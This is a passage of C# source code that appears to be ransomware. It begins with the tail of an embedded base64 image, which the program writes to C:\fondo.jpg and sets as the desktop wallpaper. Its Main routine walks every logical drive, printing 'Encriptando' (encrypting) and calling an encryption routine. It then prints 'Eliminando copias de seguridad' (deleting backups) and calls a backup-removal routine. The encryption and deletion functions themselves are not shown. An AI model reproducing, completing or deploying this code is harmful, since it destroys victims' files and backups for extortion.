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";
			var imgb = Convert.FromBase64String (imgb64);
			using (var img = new FileStream("C:\\fondo.jpg", FileMode.Create)) {
				img.Write (imgb, 0, imgb.Length);
				img.Flush ();
			}

			SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "C:\\fondo.jpg", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
		}

	    static void Main (string[] args)
		{
			string[] particiones = System.IO.Directory.GetLogicalDrives ();
			foreach (string p in particiones) {
				Console.WriteLine ("Encriptando: " + p);
				doitdir (p);
				Console.WriteLine("Eliminando copias de seguridad...");
				byebye ();
				fondo ();
			}
		}
	}
}
